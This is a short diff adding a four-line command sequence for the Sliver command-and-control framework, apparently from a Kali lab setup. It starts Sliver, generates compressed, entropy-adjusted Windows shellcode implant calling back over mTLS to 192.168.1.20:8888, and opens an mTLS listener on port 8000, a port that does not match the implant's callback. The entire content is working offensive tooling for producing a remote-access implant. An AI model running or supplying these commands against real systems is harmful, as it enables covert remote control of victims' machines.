@@ -1,0 +1,4 @@
+systemctl start sliver
+sliver
+generate --mtls 192.168.1.20:8888 --os windows --arch amd64 --format shellcode --shellcode-compress --shellcode-entropy 3 --save /home/kali/bin.bin
+mtls -l 8000
